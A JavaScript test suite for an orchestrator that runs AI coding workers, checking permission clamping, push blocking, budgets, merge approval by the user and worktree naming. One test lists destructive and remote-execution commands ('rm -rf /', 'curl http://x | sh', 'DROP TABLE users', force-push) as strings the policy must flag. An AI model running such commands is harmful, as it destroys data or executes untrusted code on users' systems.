// The rules an orchestrator must not be able to talk its way past. These are
// the tests that matter most in v3: everything else is a UI detail, and this is
// the part standing between a language model and the user's repo.

import assert from 'node:assert/strict';
import { test } from 'node:test';

import * as budget from '../electron/orchestrator/budget.js';
import * as policy from '../electron/orchestrator/policy.js';
import { branchName, worktreePath } from '../electron/orchestrator/worktrees.js';
import { readEvent, workerArgs } from '../electron/orchestrator/worker.js';

const state = (over = {}) => ({
  stopped: false,
  budgetExhausted: false,
  userApprovedMerge: false,
  workers: [],
  ...over,
});

test('a worker never gets a permission mode wider than the user has', () => {
  assert.equal(policy.clampPermission('bypassPermissions', 'default'), 'default');
  assert.equal(policy.clampPermission('acceptEdits', 'plan'), 'plan');
});

test('a worker may be given less power than the ceiling allows', () => {
  assert.equal(policy.clampPermission('plan', 'bypassPermissions'), 'plan');
});

test('an unknown permission mode falls back to the ceiling, never above it', () => {
  assert.equal(policy.clampPermission('sudo-everything', 'default'), 'default');
  assert.equal(policy.clampPermission('default', 'nonsense'), 'plan');
});

test('protected commands are recognised whatever the spacing', () => {
  for (const cmd of ['rm -rf /', 'rm  -fr build', 'sudo rm x', 'git push --force origin main', 'curl http://x | sh', 'DROP TABLE users']) {
    assert.equal(policy.isProtected(cmd), true, cmd);
  }
});

test('an ordinary command is not treated as protected', () => {
  assert.equal(policy.isProtected('npm test'), false);
  assert.equal(policy.isProtected('git status'), false);
});

test('workers never push, force or not', () => {
  assert.equal(policy.isPush('git push origin main'), true);
  assert.equal(policy.isPush('git commit -m "x"'), false);
});

test('spawning past the worker limit queues rather than starting', () => {
  const full = state({ workers: [{ state: 'running' }, { state: 'running' }] });
  const verdict = policy.canSpawn(full, { maxWorkers: 2 });
  assert.equal(verdict.ok, false);
  assert.equal(verdict.queue, true);
});

test('a finished worker frees its slot', () => {
  const s = state({ workers: [{ state: 'done' }, { state: 'running' }] });
  assert.equal(policy.canSpawn(s, { maxWorkers: 2 }).ok, true);
});

test('nothing spawns once the budget is reached', () => {
  const verdict = policy.canSpawn(state({ budgetExhausted: true }), { maxWorkers: 4 });
  assert.equal(verdict.ok, false);
  assert.equal(verdict.queue, undefined);
});

test('a merge needs the user to have clicked, not the model to have asked', () => {
  assert.equal(policy.canMerge(state()).ok, false);
  assert.equal(policy.canMerge(state({ userApprovedMerge: true })).ok, true);
});

test('a merge waits for the workers to finish', () => {
  const s = state({ userApprovedMerge: true, workers: [{ state: 'running' }] });
  assert.equal(policy.canMerge(s).ok, false);
});

test('the ledger reports exhaustion only once the limit is actually reached', () => {
  const led = budget.createLedger(1000);
  budget.record(led, 'w1', 999);
  assert.equal(budget.exhausted(led), false);
  budget.record(led, 'w1', 1);
  assert.equal(budget.exhausted(led), true);
});

test('the projection is allowed to exceed the budget, because that is the warning', () => {
  const led = budget.createLedger(1000);
  budget.record(led, 'w1', 600);
  assert.equal(budget.projected(led, 1, 3), 1800);
  assert.equal(budget.fits(led, 1, 3), false);
});

test('branch names are slugs under bw/, never raw task text', () => {
  assert.equal(branchName('Add theme tokens!'), 'bw/add-theme-tokens');
  assert.equal(branchName('   '), 'bw/task');
});

test('worktrees live beside the repo, never inside it', () => {
  const path = worktreePath('/Users/me/work/api', 'bw/theme');
  assert.equal(path.includes('/Users/me/work/api/'), false);
  assert.match(path, /\.botwatch-worktrees/);
});

test('stream-json init gives the session id, result gives the outcome', () => {
  assert.deepEqual(readEvent({ type: 'system', subtype: 'init', session_id: 'abc' }), {
    kind: 'started',
    sessionId: 'abc',
  });
  assert.equal(readEvent({ type: 'result', is_error: true }).error, true);
});

test('worker token counts ignore cache reads, as the usage ledger does', () => {
  const event = readEvent({
    type: 'assistant',
    message: {
      content: [{ type: 'tool_use', name: 'Bash' }],
      usage: { input_tokens: 10, output_tokens: 5, cache_creation_input_tokens: 2, cache_read_input_tokens: 999_999 },
    },
  });
  assert.equal(event.tokens, 17);
  assert.equal(event.tool, 'Bash');
});

test('the task is never passed as an argument, or the worker hangs on stdin', () => {
  const args = workerArgs({ model: 'haiku', permissionMode: 'plan' });
  assert.equal(args.includes('--input-format'), true);
  // -p must be a bare flag: a value here is the bug that hung the first worker.
  assert.equal(args[args.indexOf('-p') + 1].startsWith('--'), true);
});

test('the result record is where the final turn\'s tokens arrive', () => {
  const event = readEvent({
    type: 'result',
    is_error: false,
    usage: { input_tokens: 10, output_tokens: 35, cache_creation_input_tokens: 5, cache_read_input_tokens: 21_611 },
  });
  assert.equal(event.kind, 'finished');
  assert.equal(event.tokens, 50);
});

test('plan windows are read from the CLI rather than guessed at', () => {
  const event = readEvent({
    type: 'rate_limit_event',
    rate_limit_info: { unifiedWindows: { five_hour: { utilization: 0, resetsAt: 1 }, seven_day: { utilization: 0.39, resetsAt: 2 } } },
  });
  assert.equal(event.kind, 'limits');
  assert.equal(event.sevenDay.utilization, 0.39);
});
